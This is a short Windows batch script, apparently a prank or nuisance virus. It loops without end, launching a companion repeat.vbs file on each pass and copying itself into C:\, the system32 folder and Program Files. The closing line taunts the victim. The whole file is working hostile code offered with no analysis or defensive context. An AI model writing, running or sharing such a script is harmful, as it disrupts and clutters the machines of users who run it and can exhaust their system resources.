   @ ECHO OFF
   :start
   ECHO HEY HEY
   start repeat.vbs
   copy %0 c:\
   copy %0 c:\windows\system32
   copy %0 c:\progra~1
   goto :start
   ECHO Annoyed yet?
